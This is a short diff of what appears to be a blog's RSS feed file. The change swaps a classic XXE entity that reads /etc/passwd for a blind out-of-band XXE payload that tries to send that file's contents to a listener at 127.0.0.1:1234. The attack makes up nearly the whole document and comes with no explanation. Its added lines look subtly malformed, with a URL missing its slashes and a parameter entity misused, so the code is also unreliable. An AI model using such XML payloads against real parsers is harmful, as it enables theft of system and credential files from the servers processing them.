@@ -1,6 +1,8 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo (#ANY)>
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY blind SYSTEM "http:127.0.0.1:1234/?%xxe;">]><foo>&blind;</foo>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
     <title>The Blog</title>
